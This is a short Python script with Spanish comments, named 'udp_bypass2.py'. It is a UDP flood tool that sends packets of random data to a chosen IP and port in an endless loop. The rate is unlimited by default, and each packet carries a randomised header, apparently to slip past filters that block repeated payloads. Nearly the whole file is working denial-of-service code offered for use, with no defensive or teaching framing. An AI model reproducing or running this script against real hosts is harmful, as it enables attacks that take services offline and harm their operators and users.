import socket
import sys
import random
import time

def generate_random_header(header_length):
    """Genera una cabecera aleatoria de caracteres alfanuméricos."""
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=header_length))

def udp_bypass(ip, port, packet_size, rate_limit=None, header_length=20):
    try:
        # Crear un socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        print(f"Enviando paquetes UDP a {ip}:{port} con tamaño {packet_size} bytes y cabecera aleatoria.\n")

        while True:
            # Generar una cabecera aleatoria
            random_header = generate_random_header(header_length)

            # Crear el payload con la cabecera aleatoria
            payload = f"{random_header}\n" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=packet_size - len(random_header) - 1))

            # Enviar el paquete
            sock.sendto(payload.encode(), (ip, int(port)))

            # Limitar la tasa de envío si se especifica
            if rate_limit:
                time.sleep(1 / rate_limit)

    except KeyboardInterrupt:
        print("\nDetenido por el usuario.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 4 or len(sys.argv) > 6:
        print("Uso: python3 udp_bypass2.py <IP> <PORT> <PACKET_SIZE> [RATE_LIMIT] [HEADER_LENGTH]")
        sys.exit(1)

    # Leer los argumentos
    target_ip = sys.argv[1]
    target_port = sys.argv[2]
    packet_size = int(sys.argv[3])
    rate_limit = float(sys.argv[4]) if len(sys.argv) >= 5 else None
    header_length = int(sys.argv[5]) if len(sys.argv) == 6 else 20

    # Validar tamaño del paquete
    if packet_size <= header_length:
        print("Error: El tamaño del paquete debe ser mayor que el tamaño de la cabecera.")
        sys.exit(1)

    # Ejecutar el bypass UDP
    udp_bypass(target_ip, target_port, packet_size, rate_limit, header_length)
